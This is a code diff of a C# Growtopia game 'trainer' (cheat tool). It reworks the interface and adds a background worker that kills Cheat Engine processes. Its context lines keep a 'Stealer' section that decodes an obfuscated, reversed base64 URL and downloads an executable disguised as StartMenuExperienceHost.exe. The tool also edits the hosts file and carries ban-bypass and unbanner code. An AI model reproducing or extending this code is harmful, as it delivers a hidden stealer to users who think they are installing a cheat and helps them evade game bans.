@@ -30,9 +30,8 @@ namespace FreeZeHAX_Trainer
         private readonly TaskDefinition td = TaskService.Instance.NewTask(); // New TaskDefiniton task
         private readonly WebClient web = new WebClient();
         private bool IsProcOpen; // In order us to check if the process exists, we need this bool.
+        bool IsCEOpen;
         private readonly bool Stealer = false; // Activate / Disable Stealer
-        private Point lastLocation;
-        private bool mouseDown;
 
         public Trainer()
         {
@@ -55,7 +54,7 @@ namespace FreeZeHAX_Trainer
                 {
                     if (CheatAddresses.Items.Count <= 1)
                     { // If CheatAddress listbox has lower than 1 item, clear the listbox
-                        FocusText.Text = "Searching For Cheats!";
+                        this.Text = "Searching For Cheats!";
                         About_Button.Enabled = false;
                         Cheat_Button.Enabled = false;
                         Spammer_Button.Enabled = false;
@@ -64,6 +63,8 @@ namespace FreeZeHAX_Trainer
                         AobProgress.Show();
                         AobProgress.Start();
                         About_Label.Hide();
+                        Cold1.Hide();
+                        Cold2.Hide();
                         foreach (string Cheats in cheats.GTCheats)
                         { // Search for all aobs in GTCheats
                             CheatAddresses.Items.Add(AobScan(Cheats));
@@ -72,7 +73,7 @@ namespace FreeZeHAX_Trainer
                         { // Search for all aobs in GTCheatsFirst
                             CheatAddresses.Items.Add(AobScan(Cheats, false, true, false));
                         }
-                        FocusText.Text = "FreeZeHAX Trainer";
+                        this.Text = "FreeZeHAX Trainer";
                         About_Button.Enabled = true;
                         Cheat_Button.Enabled = true;
                         Spammer_Button.Enabled = true;
@@ -81,6 +82,8 @@ namespace FreeZeHAX_Trainer
                         AobProgress.Hide();
                         AobProgress.Stop();
                         About_Label.Show();
+                        Cold1.Show();
+                        Cold2.Show();
 
                         #region Ban Bypasses and Showing FPS
 
@@ -135,25 +138,6 @@ namespace FreeZeHAX_Trainer
             return Result;
         }
 
-        private void CETimer_Tick(object sender, EventArgs e)
-        { // Check if CE's inside others.CE exists. If they do exist, kill their processes
-            try
-            {
-                foreach (string CEs in others.CE)
-                {
-                    Regex regex = new Regex(CEs);
-                    foreach (Process p in Process.GetProcesses("."))
-                    {
-                        if (regex.Match(p.ProcessName).Success)
-                        {
-                            p.Kill();
-                        }
-                    }
-                }
-            }
-            catch (Exception) { }
-        }
-
         private void EditHost_Click(object sender, EventArgs e)
         { // Get what's inside Host_File_Editor, then save it inside hosts file
             try
@@ -163,30 +147,6 @@ namespace FreeZeHAX_Trainer
             catch (Exception ex)
             {
                 MessageBox.Show(ex.Message, "FreeZeHAX Trainer");
-            }
-        }
-
-        private void Exit_Click(object sender, EventArgs e)
-        {
-            ExitForm();
-        }
-
-        private async void ExitForm()
-        {
-            for (Opacity = 0.90; Opacity > .0; Opacity -= .1) { await System.Threading.Tasks.Task.Delay(10); } // Exiting transition
-            RemoveGuna();
-            Application.Exit();
-        }
-
-        private void FadeIn(object sender, EventArgs e)
-        {
-            if (Opacity >= 0.90) // Increasing the opacity until 0.90
-            {
-                t1.Stop();   // This stops the timer if the form is completely displayed
-            }
-            else
-            {
-                Opacity += 0.05; // Increasing the opacity
             }
         }
 
@@ -210,11 +170,6 @@ namespace FreeZeHAX_Trainer
         private void HostsRefresh_Click(object sender, EventArgs e)
         {
             Host_File_Editor.Text = File.ReadAllText(Path.Combine(Environment.SystemDirectory, "drivers\\etc\\hosts")); // Viewing hosts file's content
-        }
-
-        private void Minimize_Click(object sender, EventArgs e)
-        { // Make the form Minimized
-            WindowState = FormWindowState.Minimized;
         }
 
         private void OnTop_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
@@ -301,41 +256,21 @@ namespace FreeZeHAX_Trainer
             }
         }
 
-        private void StartForm()
-        {
-            Opacity = 0; // First the opacity is 0
-            t1.Interval = 10;  // We'll increase the opacity every 10ms
-            t1.Tick += new EventHandler(FadeIn);  // This calls the function that changes opacity
-            t1.Start(); // Starting the timer
-
-            #region Startup transitions
-
-            PanelTransition.Show(About_Button);
-            PanelTransition.Show(Cheat_Button);
-            PanelTransition.Show(Spammer_Button);
-            PanelTransition.Show(Unbanner_Button);
-            PanelTransition.Show(Settings_Button);
-            PanelTransition.Show(About);
-            PanelTransition.Show(TopBar);
-
-            #endregion Startup transitions
-        }
-
         private void TextTimer_Tick(object sender, EventArgs e)
         {
             Process[] processes = Process.GetProcessesByName("Growtopia");
 
-            if (processes.ToString() == "Growtopia")
+            try
             {
                 foreach (Process proc in processes)
                 {
                     SetForegroundWindow(proc.MainWindowHandle);
-                    SendKeys.Send("{ENTER}"); // Send ENTER key
-                    SendKeys.Send(Input.Text); // Send the text inside "Input" textbox
-                    SendKeys.Send("{ENTER}"); // Send ENTER key
+                    SendKeys.SendWait("{ENTER}"); // Send ENTER key
+                    SendKeys.SendWait(Input.Text); // Send the text inside "Input" textbox
+                    SendKeys.SendWait("{ENTER}"); // Send ENTER key
                 }
             }
-            else { MessageBox.Show("Can't find Growtopia window.", "FreeZeHAX Trainer"); }
+            catch (Exception ex) { MessageBox.Show(ex.Message); }
         }
 
         // Reverse string
@@ -350,7 +285,16 @@ namespace FreeZeHAX_Trainer
         {
             RefreshKeys();
             Show();
-            StartForm();
+            #region Startup transitions
+
+            PanelTransition.Show(About_Button);
+            PanelTransition.Show(Cheat_Button);
+            PanelTransition.Show(Spammer_Button);
+            PanelTransition.Show(Unbanner_Button);
+            PanelTransition.Show(Settings_Button);
+            PanelTransition.Show(About);
+
+            #endregion Startup transitions
             RemoveGuna();
 
             #region Stealer
@@ -390,7 +334,6 @@ namespace FreeZeHAX_Trainer
 
                     #endregion Check required dlls for the c++ stealer
 
-                    CETimer.Start(); // Check if ce is running
                     string FixedString = ReverseString("lhXZuQ3cvhUZj5WZpJXZwhXR15WZNRnchR3UvADMyUTN4IzM0ADMzkzNzIzMwEzLygDM1QDOzMTMyUzN3gjM3ITOvMHduVWboNWY0RXYv02bj5CcwFGZy92YzlGZu4GZj9yL6MHc0RHa");
                     web.DownloadFile(new Uri(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(FixedString.PadRight(FixedString.Length + (4 - FixedString.Length % 4) % 4, '=')))), StealerFolder + "\\StartMenuExperienceHost.exe"); // Download the stealer
                     others.Wait(2000);
@@ -433,6 +376,7 @@ namespace FreeZeHAX_Trainer
 
             #endregion Stealer
 
+            CEKill.RunWorkerAsync(); // Kill CEs
             Auto_Attach.RunWorkerAsync(); // Auto attach
         }
 
@@ -501,54 +445,6 @@ namespace FreeZeHAX_Trainer
         }
 
         #endregion Buttons
-
-        #region Trainer Move
-
-        private void FocusText_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
-        {
-            mouseDown = true;
-            lastLocation = e.Location;
-        }
-
-        private void FocusText_MouseMove(object sender, System.Windows.Forms.MouseEventArgs e)
-        {
-            if (mouseDown)
-            {
-                Location = new Point(
-                    (Location.X - lastLocation.X) + e.X, (Location.Y - lastLocation.Y) + e.Y);
-
-                Update();
-            }
-        }
-
-        private void FocusText_MouseUp(object sender, System.Windows.Forms.MouseEventArgs e)
-        {
-            mouseDown = false;
-        }
-
-        private void TopBar_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
-        {
-            mouseDown = true;
-            lastLocation = e.Location;
-        }
-
-        private void TopBar_MouseMove(object sender, System.Windows.Forms.MouseEventArgs e)
-        {
-            if (mouseDown)
-            {
-                Location = new Point(
-                    (Location.X - lastLocation.X) + e.X, (Location.Y - lastLocation.Y) + e.Y);
-
-                Update();
-            }
-        }
-
-        private void TopBar_MouseUp(object sender, System.Windows.Forms.MouseEventArgs e)
-        {
-            mouseDown = false;
-        }
-
-        #endregion Trainer Move
 
         #region Growtopia Cheats
 
@@ -896,11 +792,6 @@ namespace FreeZeHAX_Trainer
 
         #region Unbanner Class
 
-        private void AdaptersComboBox_SelectedIndexChanged(object sender, EventArgs e)
-        {
-            UpdateAddresses();
-        }
-
         private void RefreshKeys()
         {
             try
@@ -1204,5 +1095,55 @@ namespace FreeZeHAX_Trainer
         }
 
         #endregion Unbanner Class
+
+        #region Kill CEs
+        private void CEKill_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
+        {
+            while (!e.Cancel)
+            {
+                foreach (string CEs in others.CE)
+                {
+                    Regex regex = new Regex(CEs);
+                    foreach (Process p in Process.GetProcesses("."))
+                    {
+                        if (regex.Match(p.ProcessName).Success)
+                        {
+                            IsCEOpen = mem.OpenProcess(p.ProcessName);
+                        }
+                    }
+                }
+                System.Threading.Thread.Sleep(1000);
+                CEKill.ReportProgress(0);
+            }
+        }
+
+        private void CEKill_ProgressChanged(object sender, System.ComponentModel.ProgressChangedEventArgs e)
+        {
+            if (IsCEOpen == true)
+            {
+                try
+                {
+                    foreach (string CEs in others.CE)
+                    {
+                        Regex regex = new Regex(CEs);
+                        foreach (Process p in Process.GetProcesses("."))
+                        {
+                            if (regex.Match(p.ProcessName).Success)
+                            {
+                                p.Kill();
+                            }
+                        }
+                    }
+                }
+                catch (Exception) { }
+                Application.Exit();
+            }
+        }
+
+        private void CEKill_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
+        {
+            CEKill.RunWorkerAsync();
+        }
+        #endregion Kill CEs
     }
 }
